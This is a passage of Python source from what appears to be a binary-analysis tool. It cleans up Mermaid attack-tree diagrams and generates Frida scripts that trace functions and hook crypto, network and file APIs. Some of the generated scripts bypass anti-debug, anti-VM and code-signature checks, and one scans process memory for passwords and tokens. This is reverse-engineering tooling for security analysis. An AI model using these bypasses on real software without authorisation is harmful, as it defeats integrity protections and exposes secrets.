        return _generate_basic_attack_tree(attack_surface, verified_findings)


def _sanitize_mermaid_diagram(diagram: str) -> str:
    """
    Sanitize AI-generated mermaid diagram to fix common issues.
    
    Common problems:
    - Unescaped special characters in labels
    - Invalid node IDs (starting with numbers, containing special chars)
    - Missing quotes around labels with special chars
    - Emoji rendering issues
    - Malformed subgraph declarations
    - Reserved keywords (PE, PS, etc.) used as identifiers
    - Parentheses in labels that confuse the parser
    """
    import re as regex
    
    # Mermaid reserved keywords that can't be used as node IDs or in certain contexts
    # These are shape keywords that cause parse errors like "got 'PE'"
    MERMAID_RESERVED = {
        'PE', 'PS', 'SQE', 'TAGEND', 'TAGSTART', 'TEXT', 'UNICODE_TEXT',
        'DOUBLECIRCLEEND', 'STADIUMEND', 'SUBROUTINEEND', 'PIPE', 'CYLINDEREND',
        'DIAMOND_STOP', 'TRAPEND', 'INVTRAPEND', 'BR', 'TB', 'TD', 'LR', 'RL',
        'BT', 'click', 'callback', 'link', 'class', 'classDef', 'style', 'end',
        # Additional problematic patterns
        'PIE', 'PK', 'FK', 'AS', 'IS', 'ON', 'TO', 'IN', 'AT', 'BY', 'OR', 'IF',
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',  # Single letters
        'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    }
    
    def clean_label_text(label: str) -> str:
        """Clean label text to remove problematic characters and patterns."""
        # Remove parentheses and their contents if they contain problematic text
        # Replace (Local/UNC Paths) -> Local-UNC Paths
        label = regex.sub(r'\(([^)]+)\)', r'- \1 -', label)
        # Remove remaining problematic chars
        label = label.replace('(', '-').replace(')', '-')
        label = label.replace('[', '-').replace(']', '-')
        label = label.replace('{', '-').replace('}', '-')
        label = label.replace('/', '-').replace('\\', '-')
        label = label.replace('"', "'").replace('`', "'")
        label = label.replace('$', '').replace('#', '')
        label = label.replace('&', 'and').replace('<', '').replace('>', '')
        label = label.replace('|', '-').replace(';', ',')
        # Clean up multiple dashes/spaces
        label = regex.sub(r'-+', '-', label)
        label = regex.sub(r'\s+', ' ', label)
        label = label.strip('- ')
        return label
    
    def escape_reserved_in_label(label: str) -> str:
        """Escape reserved keywords in labels by modifying them."""
        # First clean the label
        label = clean_label_text(label)
        # Check if any reserved word appears standalone in the label
        words = label.split()
        new_words = []
        for word in words:
            # If word matches a reserved keyword exactly, add suffix
            clean_word = regex.sub(r'[^A-Za-z]', '', word)
            if clean_word.upper() in MERMAID_RESERVED:
                # Add suffix to avoid being parsed as keyword
                new_words.append(word.replace(clean_word, clean_word + '-item'))
            else:
                new_words.append(word)
        return ' '.join(new_words)
    
    # First pass: fix common AI mistakes
    lines = diagram.split('\n')
    sanitized_lines = []
    
    for line in lines:
        original_line = line
        
        # Skip empty lines and comments
        if not line.strip() or line.strip().startswith('%%'):
            sanitized_lines.append(line)
            continue
        
        # Skip flowchart/graph declaration lines
        if line.strip().startswith(('flowchart', 'graph', 'sequenceDiagram', 'classDiagram')):
            sanitized_lines.append(line)
            continue
        
        # Skip 'end' keyword
        if line.strip() == 'end':
            sanitized_lines.append(line)
            continue
        
        # Fix subgraph declarations: subgraph Name["Label"]
        subgraph_match = regex.match(r'(\s*)subgraph\s+(\w+)\s*\[\s*"?([^"\]]*)"?\s*\]', line)
        if subgraph_match:
            indent = subgraph_match.group(1)
            name = subgraph_match.group(2)
            label = subgraph_match.group(3).strip()
            # Clean the label
            label = label.replace('"', "'").replace('`', "'").replace('$', '')
            label = escape_reserved_in_label(label)
            if len(label) > 40:
                label = label[:37] + "..."
            # Ensure subgraph name isn't reserved
            if name.upper() in MERMAID_RESERVED:
                name = f"SG_{name}"
            sanitized_lines.append(f'{indent}subgraph {name}["{label}"]')
            continue
        
        # Fix simple subgraph: subgraph Name
        simple_subgraph = regex.match(r'(\s*)subgraph\s+([^\[\s]+)\s*$', line)
        if simple_subgraph:
            indent = simple_subgraph.group(1)
            name = simple_subgraph.group(2)
            if name.upper() in MERMAID_RESERVED:
                name = f"SG_{name}"
                line = f'{indent}subgraph {name}'
            sanitized_lines.append(line)
            continue
        
        # Fix node definitions with brackets: NodeID["Label"] or NodeID[Label]
        def fix_node_label(match):
            prefix = match.group(1) or ''  # Leading whitespace/chars
            node_id = match.group(2)
            bracket_open = match.group(3)  # [ ( { <
            label = match.group(4)
            bracket_close = match.group(5)  # ] ) } >
            suffix = match.group(6) or ''  # Trailing content (arrows, etc)
            
            # Ensure node_id starts with letter and isn't reserved
            if node_id and node_id[0].isdigit():
                node_id = 'N' + node_id
            if node_id.upper() in MERMAID_RESERVED:
                node_id = f'Node_{node_id}'
            
            # Clean up the label using our robust cleaner
            label = label.strip('"\'')
            label = escape_reserved_in_label(label)  # This now also calls clean_label_text
            
            # Truncate very long labels
            if len(label) > 50:
                label = label[:47] + "..."
            
            # Always use square brackets with quoted labels for safety
            return f'{prefix}{node_id}["{label}"]{suffix}'
        
        # Pattern to match node definitions
        # Captures: prefix, nodeId, openBracket, label, closeBracket, suffix
        node_pattern = r'^(\s*)(\w+)\s*([\[\(\{<])\s*"?([^"\]\)\}>]*)"?\s*([\]\)\}>])(.*)$'
        line = regex.sub(node_pattern, fix_node_label, line)
        
        # Fix arrow definitions that may have gotten malformed
        # Ensure proper spacing around arrows
        line = regex.sub(r'\s*-->\s*', ' --> ', line)
        line = regex.sub(r'\s*---\s*', ' --- ', line)
        line = regex.sub(r'\s*-\.->\s*', ' -.-> ', line)
        line = regex.sub(r'\s*==>\s*', ' ==> ', line)
        
        # Fix style definitions
        line = regex.sub(r'style\s+(\w+)\s+', r'style \1 ', line)
        
        sanitized_lines.append(line)
    
    result = '\n'.join(sanitized_lines)
    
    # Second pass: remove any lines that would cause parse errors
    final_lines = []
    for line in result.split('\n'):
        # Skip lines with unbalanced brackets
        if line.count('[') != line.count(']') and 'subgraph' not in line:
            # Try to fix or skip
            continue
        if line.count('(') != line.count(')'):
            continue
        final_lines.append(line)
    
    return '\n'.join(final_lines)


def _generate_basic_attack_tree(
    attack_surface: Dict[str, Any],
    verified_findings: Optional[List[Dict]] = None
) -> str:
    """Generate a basic attack tree without AI."""
    lines = ["flowchart TD"]
    
    # Entry points
    lines.append('    subgraph Entry[" Entry Points"]')
    for i, ep in enumerate(attack_surface.get("entry_points", [])[:5]):
        lines.append(f'        EP{i}["{ep["name"][:30]}"]')
    lines.append('    end')
    
    # Attack vectors
    lines.append('    subgraph Vectors[" Attack Vectors"]')
    for i, vec in enumerate(attack_surface.get("potential_attack_vectors", [])[:5]):
        risk_color = "red" if vec["risk"] == "critical" else "orange" if vec["risk"] == "high" else "yellow"
        lines.append(f'        VEC{i}["{vec["vector"]}"]')
    lines.append('    end')
    
    # Vulnerabilities
    if verified_findings:
        lines.append('    subgraph Vulns[" Vulnerabilities"]')
        for i, vuln in enumerate(verified_findings[:5]):
            lines.append(f'        VULN{i}["{vuln.get("category", "unknown")[:20]}"]')
        lines.append('    end')
    
    # Edges
    for i in range(min(len(attack_surface.get("entry_points", [])), 5)):
        for j in range(min(len(attack_surface.get("potential_attack_vectors", [])), 3)):
            lines.append(f'    EP{i} --> VEC{j}')
    
    if verified_findings:
        for i in range(min(len(attack_surface.get("potential_attack_vectors", [])), 3)):
            for j in range(min(len(verified_findings), 3)):
                lines.append(f'    VEC{i} --> VULN{j}')
    
    return "\n".join(lines)


# =============================================================================
# PART 7: BINARY FRIDA SCRIPTS (Like APK's Frida generation)
# =============================================================================

def generate_binary_frida_scripts(
    binary_name: str,
    static_result: Optional[Any] = None,
    ghidra_result: Optional[Dict[str, Any]] = None,
    obfuscation_result: Optional[Dict[str, Any]] = None,
    verified_findings: Optional[List[Dict]] = None,
    vuln_hunt_findings: Optional[List[Dict]] = None,
    attack_surface_result: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Generate Frida scripts for binary dynamic analysis.
    
    Similar to APK's generate_frida_scripts().
    
    Args:
        binary_name: Name of the binary
        static_result: Static analysis result
        ghidra_result: Ghidra decompilation
        obfuscation_result: Obfuscation analysis
        verified_findings: Verified vulnerabilities
        vuln_hunt_findings: AI vulnerability hunt findings
        attack_surface_result: Attack surface mapping results
        
    Returns:
        Collection of Frida scripts with protection detection flags
    """
    scripts = {
        "module_name": binary_name,
        "scripts": [],
        "total_scripts": 0,
        "categories": {},
    }
    
    # =========================================================================
    # PROTECTION DETECTION (Like APK analyzer)
    # =========================================================================
    anti_debug_detected = False
    anti_vm_detected = False
    anti_tampering_detected = False
    packing_detected = False
    code_integrity_detected = False
    
    anti_debug_patterns_found = []
    anti_vm_patterns_found = []
    anti_tampering_patterns_found = []
    
    # Anti-debugging detection patterns (Windows/Linux)
    anti_debug_patterns = [
        # Windows anti-debug APIs
        ('IsDebuggerPresent', 'Windows API - basic debugger check'),
        ('CheckRemoteDebuggerPresent', 'Windows API - remote debugger check'),
        ('NtQueryInformationProcess', 'NT API - ProcessDebugPort check'),
        ('NtSetInformationThread', 'NT API - ThreadHideFromDebugger'),
        ('OutputDebugString', 'Debug output detection'),
        ('QueryPerformanceCounter', 'Timing-based anti-debug'),
        ('GetTickCount', 'Timing-based anti-debug'),
        ('rdtsc', 'CPU timing instruction'),
        ('int 3', 'Breakpoint trap'),
        ('int 2d', 'Kernel debugger check'),
        # Linux anti-debug
        ('ptrace', 'Linux - PTRACE_TRACEME check'),
        ('TracerPid', 'Linux - /proc/self/status check'),
        ('/proc/self/status', 'Linux - process status check'),
    ]
    
    # Anti-VM/Emulator detection patterns
    anti_vm_patterns = [
        # VMware detection
        ('VMware', 'VMware hypervisor detection'),
        ('vmtoolsd', 'VMware tools detection'),
        ('vmwaretray', 'VMware tray detection'),
        ('vmwareuser', 'VMware user detection'),
        ('vmmouse', 'VMware mouse driver'),
        ('vmhgfs', 'VMware shared folders'),
        # VirtualBox detection
        ('VirtualBox', 'VirtualBox hypervisor detection'),
        ('VBoxService', 'VirtualBox service detection'),
        ('VBoxTray', 'VirtualBox tray detection'),
        ('vboxmouse', 'VirtualBox mouse driver'),
        # Hyper-V detection
        ('Hyper-V', 'Hyper-V detection'),
        ('vmbus', 'Hyper-V bus detection'),
        # General VM detection
        ('CPUID', 'CPU identification (VM detection)'),
        ('hypervisor', 'Generic hypervisor check'),
        ('Virtual', 'Generic virtual machine check'),
        ('QEMU', 'QEMU detection'),
        ('Xen', 'Xen hypervisor detection'),
        # Hardware/MAC checks
        ('00:0C:29', 'VMware MAC prefix'),
        ('00:50:56', 'VMware MAC prefix'),
        ('08:00:27', 'VirtualBox MAC prefix'),
    ]
    
    # Anti-tampering/Integrity check patterns
    anti_tampering_patterns = [
        ('checksum', 'File checksum verification'),
        ('hash', 'Hash verification'),
        ('integrity', 'Integrity check'),
        ('signature', 'Signature verification'),
        ('Authenticode', 'Windows code signing'),
        ('WinVerifyTrust', 'Windows signature API'),
        ('CryptVerifySignature', 'Crypto signature verify'),
        ('CRC32', 'CRC checksum'),
        ('MD5', 'MD5 hash check'),
        ('SHA', 'SHA hash check'),
        ('self_check', 'Self-integrity check'),
        ('tamper', 'Tampering detection'),
    ]
    
    # Collect strings from static analysis
    all_strings = []
    if static_result:
        for s in getattr(static_result, 'strings_sample', [])[:500]:
            if hasattr(s, 'value'):
                all_strings.append(s.value)
            elif isinstance(s, dict):
                all_strings.append(s.get('value', ''))
            elif isinstance(s, str):
                all_strings.append(s)
    
    # Also check imports
    import_names = []
    if static_result:
        for imp in getattr(static_result, 'imports', [])[:200]:
            if hasattr(imp, 'name'):
                import_names.append(imp.name)
            elif isinstance(imp, dict):
                import_names.append(imp.get('name', ''))
    
    # Combine for checking
    all_searchable = all_strings + import_names
    searchable_text = ' '.join(all_searchable).lower()
    
    # Detect anti-debugging
    for pattern, description in anti_debug_patterns:
        if pattern.lower() in searchable_text:
            anti_debug_detected = True
            anti_debug_patterns_found.append({
                'pattern': pattern,
                'description': description
            })
    
    # Detect anti-VM
    for pattern, description in anti_vm_patterns:
        if pattern.lower() in searchable_text:
            anti_vm_detected = True
            anti_vm_patterns_found.append({
                'pattern': pattern,
                'description': description
            })
    
    # Detect anti-tampering
    for pattern, description in anti_tampering_patterns:
        if pattern.lower() in searchable_text:
            anti_tampering_detected = True
            anti_tampering_patterns_found.append({
                'pattern': pattern,
                'description': description
            })
    
    # Check obfuscation result for packing
    if obfuscation_result:
        packing_detected = bool(obfuscation_result.get('detected_packers', []))
        if obfuscation_result.get('obfuscation_score', 0) > 50:
            packing_detected = True
    
    # Check for code integrity in decompiled functions
    if ghidra_result:
        funcs = ghidra_result.get('functions', [])
        for func in funcs[:50]:
            func_name = func.get('name', '').lower()
            if any(p in func_name for p in ['checksum', 'verify', 'integrity', 'hash']):
                code_integrity_detected = True
                break
    
    try:
        # 1. Anti-debugging bypass script
        anti_debug_script = f'''// Anti-Debugging Bypass for {binary_name}
// Generated by VRAgent

console.log("[*] Anti-Debug Bypass loaded");

// Bypass IsDebuggerPresent
var isDebuggerPresent = Module.findExportByName("kernel32.dll", "IsDebuggerPresent");
if (isDebuggerPresent) {{
    Interceptor.replace(isDebuggerPresent, new NativeCallback(function() {{
        console.log("[+] IsDebuggerPresent() -> FALSE");
        return 0;
    }}, 'int', []));
}}

// Bypass CheckRemoteDebuggerPresent
var checkRemote = Module.findExportByName("kernel32.dll", "CheckRemoteDebuggerPresent");
if (checkRemote) {{
    Interceptor.attach(checkRemote, {{
        onEnter: function(args) {{
            this.pbDebuggerPresent = args[1];
        }},
        onLeave: function(retval) {{
            if (this.pbDebuggerPresent) {{
                Memory.writeU32(this.pbDebuggerPresent, 0);
                console.log("[+] CheckRemoteDebuggerPresent() -> FALSE");
            }}
        }}
    }});
}}

// Bypass NtQueryInformationProcess
var ntQuery = Module.findExportByName("ntdll.dll", "NtQueryInformationProcess");
if (ntQuery) {{
    Interceptor.attach(ntQuery, {{
        onEnter: function(args) {{
            this.infoClass = args[1].toInt32();
            this.buffer = args[2];
        }},
        onLeave: function(retval) {{
            if (this.infoClass === 7) {{ // ProcessDebugPort
                Memory.writePointer(this.buffer, ptr(0));
                console.log("[+] NtQueryInformationProcess(ProcessDebugPort) -> 0");
            }}
        }}
    }});
}}

console.log("[*] Anti-debug hooks installed");
'''
        scripts["scripts"].append({
            "name": "anti_debug_bypass",
            "category": "anti_analysis",
            "description": "Bypass common anti-debugging techniques",
            "code": anti_debug_script
        })
        
        # 2. Function tracing script
        trace_script = f'''// Function Tracer for {binary_name}
// Generated by VRAgent

console.log("[*] Function Tracer loaded");

var moduleName = "{binary_name}";
var baseAddr = Module.findBaseAddress(moduleName);

if (baseAddr) {{
    console.log("[+] Module base: " + baseAddr);
    
    // Hook exports
    var exports = Module.enumerateExports(moduleName);
    exports.slice(0, 50).forEach(function(exp) {{
        if (exp.type === "function") {{
            try {{
                Interceptor.attach(exp.address, {{
                    onEnter: function(args) {{
                        console.log("[CALL] " + exp.name);
                    }},
                    onLeave: function(retval) {{
                        console.log("[RET] " + exp.name + " -> " + retval);
                    }}
                }});
            }} catch(e) {{}}
        }}
    }});
    console.log("[+] Hooked " + Math.min(exports.length, 50) + " exports");
}} else {{
    console.log("[-] Module not found");
}}
'''
        scripts["scripts"].append({
            "name": "function_tracer",
            "category": "tracing",
            "description": "Trace function calls and returns",
            "code": trace_script
        })
        
        # 3. Memory scanner script
        memory_script = f'''// Memory Scanner for {binary_name}
// Generated by VRAgent

console.log("[*] Memory Scanner loaded");

function scanForStrings(pattern) {{
    var ranges = Process.enumerateRanges('r--');
    ranges.forEach(function(range) {{
        try {{
            var matches = Memory.scanSync(range.base, range.size, pattern);
            matches.forEach(function(match) {{
                console.log("[FOUND] " + match.address + ": " + Memory.readUtf8String(match.address));
            }});
        }} catch(e) {{}}
    }});
}}

// Scan for common sensitive strings
function scanSecrets() {{
    console.log("[*] Scanning for potential secrets...");
    var patterns = [
        "password", "secret", "api_key", "token", 
        "private", "credential", "auth"
    ];
    patterns.forEach(function(p) {{
        scanForStrings(p);
    }});
}}

// Export functions
rpc.exports = {{
    scan: scanSecrets,
    scanPattern: scanForStrings
}};
'''
        scripts["scripts"].append({
            "name": "memory_scanner",
            "category": "memory",
            "description": "Scan memory for sensitive strings",
            "code": memory_script
        })
        
        # 4. Crypto hooks script
        crypto_script = f'''// Crypto API Hooks for {binary_name}
// Generated by VRAgent

console.log("[*] Crypto Hooks loaded");

// Hook CryptEncrypt
var cryptEncrypt = Module.findExportByName("advapi32.dll", "CryptEncrypt");
if (cryptEncrypt) {{
    Interceptor.attach(cryptEncrypt, {{
        onEnter: function(args) {{
            this.pbData = args[4];
            this.pdwDataLen = args[5];
        }},
        onLeave: function(retval) {{
            if (retval.toInt32() !== 0) {{
                var len = Memory.readU32(this.pdwDataLen);
                console.log("[ENCRYPT] " + len + " bytes");
                if (len < 256) {{
                    console.log("  Data: " + hexdump(this.pbData, {{length: len}}));
                }}
            }}
        }}
    }});
}}

// Hook CryptDecrypt
var cryptDecrypt = Module.findExportByName("advapi32.dll", "CryptDecrypt");
if (cryptDecrypt) {{
    Interceptor.attach(cryptDecrypt, {{
        onEnter: function(args) {{
            this.pbData = args[4];
            this.pdwDataLen = args[5];
        }},
        onLeave: function(retval) {{
            if (retval.toInt32() !== 0) {{
                var len = Memory.readU32(this.pdwDataLen);
                console.log("[DECRYPT] " + len + " bytes");
                if (len < 256) {{
                    console.log("  Data: " + hexdump(this.pbData, {{length: len}}));
                }}
            }}
        }}
    }});
}}

// Hook BCrypt functions (Windows 7+)
var bcryptEncrypt = Module.findExportByName("bcrypt.dll", "BCryptEncrypt");
if (bcryptEncrypt) {{
    Interceptor.attach(bcryptEncrypt, {{
        onEnter: function(args) {{
            console.log("[BCRYPT_ENCRYPT] Input length: " + args[2].toInt32());
        }}
    }});
}}

console.log("[*] Crypto hooks installed");
'''
        scripts["scripts"].append({
            "name": "crypto_hooks",
            "category": "crypto",
            "description": "Hook Windows crypto APIs to capture encryption/decryption",
            "code": crypto_script
        })
        
        # 5. Network hooks script
        network_script = f'''// Network API Hooks for {binary_name}
// Generated by VRAgent

console.log("[*] Network Hooks loaded");

// Hook send
var send = Module.findExportByName("ws2_32.dll", "send");
if (send) {{
    Interceptor.attach(send, {{
        onEnter: function(args) {{
            var buf = args[1];
            var len = args[2].toInt32();
            console.log("[SEND] " + len + " bytes");
            if (len < 512) {{
                console.log(hexdump(buf, {{length: len}}));
            }}
        }}
    }});
}}

// Hook recv
var recv = Module.findExportByName("ws2_32.dll", "recv");
if (recv) {{
    Interceptor.attach(recv, {{
        onEnter: function(args) {{
            this.buf = args[1];
        }},
        onLeave: function(retval) {{
            var len = retval.toInt32();
            if (len > 0) {{
                console.log("[RECV] " + len + " bytes");
                if (len < 512) {{
                    console.log(hexdump(this.buf, {{length: len}}));
                }}
            }}
        }}
    }});
}}

// Hook connect
var connect = Module.findExportByName("ws2_32.dll", "connect");
if (connect) {{
    Interceptor.attach(connect, {{
        onEnter: function(args) {{
            var sockaddr = args[1];
            var family = Memory.readU16(sockaddr);
            if (family === 2) {{ // AF_INET
                var port = Memory.readU16(sockaddr.add(2));
                port = ((port & 0xFF) << 8) | ((port >> 8) & 0xFF); // ntohs
                var ip = Memory.readU32(sockaddr.add(4));
                console.log("[CONNECT] " + 
                    ((ip) & 0xFF) + "." +
                    ((ip >> 8) & 0xFF) + "." +
                    ((ip >> 16) & 0xFF) + "." +
                    ((ip >> 24) & 0xFF) + ":" + port);
            }}
        }}
    }});
}}

console.log("[*] Network hooks installed");
'''
        scripts["scripts"].append({
            "name": "network_hooks",
            "category": "network",
            "description": "Hook network APIs to capture traffic",
            "code": network_script
        })
        
        # 6. File hooks script
        file_script = f'''// File API Hooks for {binary_name}
// Generated by VRAgent

console.log("[*] File Hooks loaded");

// Hook CreateFileW
var createFileW = Module.findExportByName("kernel32.dll", "CreateFileW");
if (createFileW) {{
    Interceptor.attach(createFileW, {{
        onEnter: function(args) {{
            var filename = args[0].readUtf16String();
            console.log("[CreateFile] " + filename);
        }}
    }});
}}

// Hook ReadFile
var readFile = Module.findExportByName("kernel32.dll", "ReadFile");
if (readFile) {{
    Interceptor.attach(readFile, {{
        onEnter: function(args) {{
            this.handle = args[0];
            this.buffer = args[1];
            this.bytesToRead = args[2].toInt32();
        }},
        onLeave: function(retval) {{
            console.log("[ReadFile] Handle: " + this.handle + ", Requested: " + this.bytesToRead);
        }}
    }});
}}

// Hook WriteFile
var writeFile = Module.findExportByName("kernel32.dll", "WriteFile");
if (writeFile) {{
    Interceptor.attach(writeFile, {{
        onEnter: function(args) {{
            var bytesToWrite = args[2].toInt32();
            console.log("[WriteFile] Handle: " + args[0] + ", Bytes: " + bytesToWrite);
        }}
    }});
}}

console.log("[*] File hooks installed");
'''
        scripts["scripts"].append({
            "name": "file_hooks",
            "category": "file",
            "description": "Hook file operations",
            "code": file_script
        })
        
        # 7. Anti-VM/Sandbox Bypass Script
        anti_vm_script = f'''// Anti-VM/Sandbox Bypass for {binary_name}
// Generated by VRAgent

console.log("[*] Anti-VM Bypass loaded");

// Bypass CPUID hypervisor detection
var cpuidHook = Module.findExportByName(null, "__cpuid");
if (cpuidHook) {{
    Interceptor.attach(cpuidHook, {{
        onLeave: function(retval) {{
            // Clear hypervisor bit in CPUID leaf 1
            console.log("[+] CPUID call intercepted");
        }}
    }});
}}

// Bypass registry VM detection (Windows)
var regOpenKey = Module.findExportByName("advapi32.dll", "RegOpenKeyExW");
if (regOpenKey) {{
    Interceptor.attach(regOpenKey, {{
        onEnter: function(args) {{
            var keyPath = args[1].readUtf16String();
            if (keyPath) {{
                var vmKeys = ["VMware", "VirtualBox", "Virtual Machine", "VBOX", "Hyper-V"];
                for (var i = 0; i < vmKeys.length; i++) {{
                    if (keyPath.indexOf(vmKeys[i]) !== -1) {{
                        console.log("[+] Blocked VM registry key: " + keyPath);
                        this.blockKey = true;
                    }}
                }}
            }}
        }},
        onLeave: function(retval) {{
            if (this.blockKey) {{
                retval.replace(2);  // ERROR_FILE_NOT_FOUND
            }}
        }}
    }});
}}

// Bypass device name checks
var getSystemInfo = Module.findExportByName("kernel32.dll", "GetSystemInfo");
if (getSystemInfo) {{
    console.log("[*] GetSystemInfo available for patching");
}}

// Bypass process enumeration (sandbox check)
var createToolhelp32Snapshot = Module.findExportByName("kernel32.dll", "CreateToolhelp32Snapshot");
if (createToolhelp32Snapshot) {{
    Interceptor.attach(createToolhelp32Snapshot, {{
        onEnter: function(args) {{
            console.log("[ENUM] CreateToolhelp32Snapshot called");
        }}
    }});
}}

// Bypass timing checks (sandbox fast-forward detection)
var getTickCount = Module.findExportByName("kernel32.dll", "GetTickCount");
if (getTickCount) {{
    var baseTime = 0;
    Interceptor.attach(getTickCount, {{
        onLeave: function(retval) {{
            if (baseTime === 0) {{
                baseTime = retval.toInt32();
            }}
            // Return realistic time progression
            console.log("[+] GetTickCount intercepted");
        }}
    }});
}}

console.log("[*] Anti-VM bypass installed");
'''
        scripts["scripts"].append({
            "name": "anti_vm_bypass",
            "category": "anti_analysis",
            "description": "Bypass VM/sandbox detection techniques",
            "code": anti_vm_script
        })
        
        # 8. Integrity Check Bypass Script
        integrity_script = f'''// Integrity Check Bypass for {binary_name}
// Generated by VRAgent

console.log("[*] Integrity Bypass loaded");

// Hook checksum functions
var crc32Funcs = ["RtlComputeCrc32", "crc32"];
crc32Funcs.forEach(function(funcName) {{
    var addr = Module.findExportByName(null, funcName);
    if (addr) {{
        Interceptor.attach(addr, {{
            onEnter: function(args) {{
                console.log("[INTEGRITY] " + funcName + " called");
            }},
            onLeave: function(retval) {{
                console.log("[INTEGRITY] " + funcName + " -> " + retval);
            }}
        }});
    }}
}});

// Hook hash functions  
var hashFuncs = [
    {{"dll": "bcrypt.dll", "name": "BCryptHash"}},
    {{"dll": "advapi32.dll", "name": "CryptHashData"}},
    {{"dll": "advapi32.dll", "name": "CryptGetHashParam"}}
];

hashFuncs.forEach(function(f) {{
    var addr = Module.findExportByName(f.dll, f.name);
    if (addr) {{
        Interceptor.attach(addr, {{
            onEnter: function(args) {{
                console.log("[HASH] " + f.name + " called");
            }}
        }});
    }}
}});

// Hook signature verification
var winVerifyTrust = Module.findExportByName("wintrust.dll", "WinVerifyTrust");
if (winVerifyTrust) {{
    Interceptor.replace(winVerifyTrust, new NativeCallback(function(hwnd, actionId, data) {{
        console.log("[+] WinVerifyTrust() -> SUCCESS");
        return 0;  // Always return success
    }}, 'long', ['pointer', 'pointer', 'pointer']));
}}

console.log("[*] Integrity bypass installed");
'''
        scripts["scripts"].append({
            "name": "integrity_bypass",
            "category": "anti_analysis",
            "description": "Bypass integrity checks and code signing verification",
            "code": integrity_script
        })
        
        # 9. Vulnerability-specific hooks based on findings
        if verified_findings:
            vuln_hooks = []
            for finding in verified_findings[:5]:
                category = finding.get("category", "")
                func_name = finding.get("function_name", "")
                
                if func_name and category:
                    vuln_hooks.append(f'''
// Hook vulnerable function: {func_name}
// Category: {category}
var addr_{func_name.replace(" ", "_")} = Module.findExportByName(null, "{func_name}");
if (addr_{func_name.replace(" ", "_")}) {{
    Interceptor.attach(addr_{func_name.replace(" ", "_")}, {{
        onEnter: function(args) {{
            console.log("[VULN:{category}] {func_name} called");
            console.log("  Backtrace:\\n" + Thread.backtrace(this.context, Backtracer.ACCURATE)
                .map(DebugSymbol.fromAddress).join("\\n"));
        }}
    }});
}}''')
            
            if vuln_hooks:
                vuln_script = f'''// Vulnerability-Specific Hooks for {binary_name}
// Generated by VRAgent

console.log("[*] Vulnerability Hooks loaded");
{"".join(vuln_hooks)}
console.log("[*] Vulnerability hooks installed");
'''
                scripts["scripts"].append({
                    "name": "vulnerability_hooks",
                    "category": "vulnerability",
                    "description": "Hook functions related to discovered vulnerabilities",
                    "code": vuln_script
                })
        
        # 10. AI Vulnerability Hunt hooks (from multi-pass vuln hunt)
        if vuln_hunt_findings:
            hunt_hooks = []
            for finding in vuln_hunt_findings[:10]:
                func_name = finding.get("function_name", "")
                category = finding.get("category", "unknown")
                severity = finding.get("severity", "medium")
                title = finding.get("title", "Unknown vulnerability")
                
                if func_name:
                    safe_name = func_name.replace(" ", "_").replace("-", "_")
                    hunt_hooks.append(f'''
// AI-Discovered: {title}
// Severity: {severity} | Category: {category}
var addr_{safe_name} = Module.findExportByName(null, "{func_name}");
if (!addr_{safe_name}) {{
    // Try to find by pattern in module
    var modules = Process.enumerateModules();
    for (var i = 0; i < modules.length; i++) {{
        addr_{safe_name} = Module.findExportByName(modules[i].name, "{func_name}");
        if (addr_{safe_name}) break;
    }}
}}
if (addr_{safe_name}) {{
    console.log("[AI-HUNT] Found {func_name} at " + addr_{safe_name});
    Interceptor.attach(addr_{safe_name}, {{
        onEnter: function(args) {{
            console.log("[AI-HUNT:{severity}] {func_name} called");
            console.log("  Vulnerability: {title}");
            console.log("  Args: " + args[0] + ", " + args[1] + ", " + args[2]);
            console.log("  Backtrace:\\n" + Thread.backtrace(this.context, Backtracer.ACCURATE)
                .map(DebugSymbol.fromAddress).join("\\n"));
        }},
        onLeave: function(retval) {{
            console.log("[AI-HUNT] {func_name} returned: " + retval);
        }}
    }});
}}''')
            
            if hunt_hooks:
                hunt_script = f'''// AI Vulnerability Hunt Hooks for {binary_name}
// Generated by VRAgent - Multi-pass AI analysis found these vulnerable functions

console.log("[*] AI Vulnerability Hunt Hooks loaded");
console.log("[*] Monitoring {len(vuln_hunt_findings)} AI-discovered vulnerable functions");
{"".join(hunt_hooks)}
console.log("[*] AI hunt hooks installed");
'''
                scripts["scripts"].append({
                    "name": "ai_vuln_hunt_hooks",
                    "category": "vulnerability",
                    "description": f"Hook {len(vuln_hunt_findings)} AI-discovered vulnerable functions",
                    "code": hunt_script
                })
        
        # 11. Attack Surface Entry Point hooks
        if attack_surface_result:
            entry_points = attack_surface_result.get("entry_points", [])
            dangerous_funcs = attack_surface_result.get("dangerous_functions", [])
            
            entry_hooks = []
            for ep in entry_points[:8]:
                ep_name = ep.get("name", "")
                ep_type = ep.get("type", "export")
                ep_risk = ep.get("risk_level", "medium")
                
                if ep_name:
                    safe_name = ep_name.replace(" ", "_").replace("-", "_").replace("@", "_")
                    entry_hooks.append(f'''
// Entry Point: {ep_name} ({ep_type}, risk: {ep_risk})
var ep_{safe_name} = Module.findExportByName(null, "{ep_name}");
if (ep_{safe_name}) {{
    Interceptor.attach(ep_{safe_name}, {{
        onEnter: function(args) {{
            console.log("[ENTRY:{ep_risk}] {ep_name} called ({ep_type})");
            console.log("  Args[0-3]: " + args[0] + ", " + args[1] + ", " + args[2] + ", " + args[3]);
        }}
    }});
}}''')
            
            # Also hook dangerous functions from attack surface
            for df in dangerous_funcs[:8]:
                df_name = df.get("name", "")
                df_reason = df.get("reason", "dangerous function")
                df_severity = df.get("severity", "high")
                
                if df_name and df_name not in [ep.get("name") for ep in entry_points]:
                    safe_name = df_name.replace(" ", "_").replace("-", "_")
                    entry_hooks.append(f'''
// Dangerous: {df_name} - {df_reason}
var df_{safe_name} = Module.findExportByName(null, "{df_name}");
if (df_{safe_name}) {{
    Interceptor.attach(df_{safe_name}, {{
        onEnter: function(args) {{
            console.log("[DANGER:{df_severity}] {df_name} called");
            console.log("  Risk: {df_reason}");
            console.log("  Backtrace:\\n" + Thread.backtrace(this.context, Backtracer.ACCURATE)
                .map(DebugSymbol.fromAddress).join("\\n"));
        }}
    }});
}}''')
            
            if entry_hooks:
                entry_script = f'''// Attack Surface Entry Point Hooks for {binary_name}
// Generated by VRAgent Attack Surface Analysis

console.log("[*] Attack Surface Hooks loaded");
console.log("[*] Monitoring {len(entry_points)} entry points and {len(dangerous_funcs)} dangerous functions");
{"".join(entry_hooks)}
console.log("[*] Attack surface hooks installed");
'''
                scripts["scripts"].append({
